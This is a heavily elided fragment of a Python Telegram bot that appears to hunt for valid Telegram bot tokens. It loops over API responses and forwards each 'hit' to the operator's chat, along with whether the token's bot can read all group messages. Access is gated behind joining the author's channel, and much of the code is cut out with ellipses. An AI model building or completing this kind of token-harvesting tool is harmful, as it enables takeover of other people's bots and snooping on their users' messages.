...
def start(me):
	if bot.get_chat_member(f"@course_py",me.from_user.id).status == "left":
...
def hit(mee):
	global stop
	if bot.get_chat_member(f"@course_py",mee.from_user.id).status == "left":
		den = types.InlineKeyboardButton('my channel', url='t.me/course_py')
		ka = types.InlineKeyboardButton('bot channel', url='t.me/d_xiimCH')
		kc = types.InlineKeyboardMarkup(row_width=2);kc.add(den, ka)
    ...
    '''
			...
			while True:
				...
				if ('result') in response:
					...
					hel = result['supports_inline_queries']
					hell = result['can_read_all_group_messages']
					...
					ma.add(pro)
					bot.send_message(id_derk,text=f'''
	<strong>
❖ - <s>New Hit Token </s>🎭
...
[⌯] Can read all gruop mes ⌯ {hell}
[⌯] Supports inline queries ⌯ {hel}
	</strong>
dev👨‍💻 @d_xiim
